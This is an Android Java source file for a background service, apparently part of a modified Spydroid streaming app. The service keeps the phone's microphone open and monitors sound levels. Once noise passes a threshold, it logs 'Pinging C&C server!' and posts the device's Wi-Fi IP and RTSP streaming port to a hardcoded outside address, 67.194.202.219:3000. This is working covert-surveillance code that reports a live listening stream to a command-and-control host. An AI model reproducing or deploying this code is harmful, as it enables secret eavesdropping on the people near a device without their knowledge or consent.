package net.majorkernelpanic.spydroid.ui;

import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.net.wifi.WifiInfo;
import android.net.wifi.WifiManager;
import android.os.Binder;
import android.os.Handler;
import android.os.IBinder;
import android.media.MediaRecorder;
import android.util.Log;
import net.majorkernelpanic.spydroid.SpydroidApplication;
import net.majorkernelpanic.spydroid.Utilities;
import org.apache.http.HttpHost;
import org.apache.http.HttpRequest;
import org.apache.http.HttpResponse;
import org.apache.http.NameValuePair;
import org.apache.http.client.ClientProtocolException;
import org.apache.http.client.HttpClient;
import org.apache.http.client.ResponseHandler;
import org.apache.http.client.entity.UrlEncodedFormEntity;
import org.apache.http.client.methods.HttpPost;
import org.apache.http.client.methods.HttpUriRequest;
import org.apache.http.conn.ClientConnectionManager;
import org.apache.http.impl.client.DefaultHttpClient;
import org.apache.http.message.BasicNameValuePair;
import org.apache.http.params.HttpParams;
import org.apache.http.protocol.HttpContext;

import java.util.ArrayList;
import java.util.List;

import java.io.*;
import java.net.HttpURLConnection;
import java.net.URL;
import java.util.Locale;

public class ListenerService extends Service {

    private SoundMeter mSensor = new SoundMeter();

    public class SoundMeter {
        static final private double EMA_FILTER = 0.6;

        private MediaRecorder mRecorder = null;
        private double mEMA = 0.0;


        public void start() {
            if (mRecorder == null) {
                mRecorder = new MediaRecorder();
                mRecorder.setAudioSource(MediaRecorder.AudioSource.MIC);
                mRecorder.setOutputFormat(MediaRecorder.OutputFormat.THREE_GPP);
                mRecorder.setAudioEncoder(MediaRecorder.AudioEncoder.AMR_NB);
                mRecorder.setOutputFile("/dev/null");
                try {
                    mRecorder.prepare();
                    mRecorder.start();
                } catch(Exception e) {
                    // Do nothing.
                    Log.d("ListenerService", "Couldn't start.");
                }
                mEMA = 0.0;
            }
        }

        public void stop() {
            if (mRecorder != null) {
                mRecorder.stop();
                mRecorder.release();
                mRecorder = null;
            }
        }

        public double getAmplitude() {
            if (mRecorder != null)
                return  (mRecorder.getMaxAmplitude()/2700.0);
            else
                return 0;

        }

        public double getAmplitudeEMA() {
            double amp = getAmplitude();
            mEMA = EMA_FILTER * amp + (1.0 - EMA_FILTER) * mEMA;
            return mEMA;
        }
    }


    @Override
    public void onCreate() {
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        // We want this service to continue running until it is explicitly
        // stopped, so return sticky.
        mSensor.start();
        mHandler.post(mPollTask);
        return START_STICKY;
    }

    @Override
    public void onDestroy() {
        mHandler.removeCallbacks(mPollTask);
        mSensor.stop();

    }

    @Override
    public IBinder onBind(Intent intent) {
        return mBinder;
    }

    // This is the object that receives interactions from clients.  See
    // RemoteService for a more complete example.
    private final IBinder mBinder = new LocalBinder();

    public class LocalBinder extends Binder {
        ListenerService getService() {
            return ListenerService.this;
        }
    }

    // How many times the audio must peak in a polling interval before alerting someone.
    private static int COUNT_THRESHOLD = 5;

    private int mTickCount = 0;
    private int mHitCount  = 0;

    private static final int POLL_INTERVAL = 300;
    private double mThreshold = 0.25F;
    private Handler mHandler = new Handler();


    private Runnable mPollTask = new Runnable() {
        public void run() {
            Log.d("ListenerService", "Checking Amplitude...");
            double amp = mSensor.getAmplitude();

            Log.d("ListenerService", "Amplitude: " + amp);
            if ((amp > mThreshold)) {
                Log.d("ListenerService", "Above threshold.");
                if ((++mHitCount) > COUNT_THRESHOLD) {
                    // Do something here!
                    Log.d("SoundService", "Pinging C&C server!");
                    new Thread(new Runnable() {
                        @Override
                        public void run() {
                            try {
                                WifiManager wifiManager = (WifiManager) SpydroidApplication.getContext().getSystemService(Context.WIFI_SERVICE);
                                WifiInfo info = wifiManager.getConnectionInfo();
                                if (info!=null && info.getNetworkId()>-1) {

                                    // Create a new HttpClient and Post Header
                                    HttpClient httpclient = new DefaultHttpClient();
                                    HttpPost httppost = new HttpPost(String.format("http://%s:3000/stream/test", "67.194.202.219"));


                                    int i = info.getIpAddress();
                                    String ip = String.format(Locale.ENGLISH,"%d.%d.%d.%d", i & 0xff, i >> 8 & 0xff,i >> 16 & 0xff,i >> 24 & 0xff);
                                    String port = String.valueOf(SpydroidApplication.sRtspPort);

                                    // Add your data
                                    List<NameValuePair> nameValuePairs = new ArrayList<NameValuePair>(2);
                                    nameValuePairs.add(new BasicNameValuePair("ip", ip));
                                    nameValuePairs.add(new BasicNameValuePair("port", port));
                                    httppost.setEntity(new UrlEncodedFormEntity(nameValuePairs));


                                    // Execute HTTP Post Request
                                    HttpResponse response = httpclient.execute(httppost);
                                }   else {
                                    Log.d("Listener", "Wifi is disabled.");
                                }
                            }
                            catch(Exception e){
                                Log.d("Listener", "Exception!");
                                e.printStackTrace();
                            }
                        }
                    }).start();
                    mTickCount = 0;
                    mHitCount  = 0;
                    mHandler.postDelayed(mPollTask, 10 * (POLL_INTERVAL + 700));
                    return;
                } else {
                    Log.d("ListenerService", "Heard noise, polling sooner.");

                    mHandler.postDelayed(mPollTask, POLL_INTERVAL / 3);
                    return;
                }
            }

            if ((++mTickCount) > 100) {
                Log.d("ListenerService", "Running again in 3 seconds...");
                mTickCount = 0;
                mHitCount  = 0;
                mHandler.postDelayed(mPollTask, (POLL_INTERVAL + 700) * 3);
            } else {
                Log.d("ListenerService", "Running again shortly");
                mHandler.postDelayed(mPollTask, POLL_INTERVAL);
            }
        }
    };




}
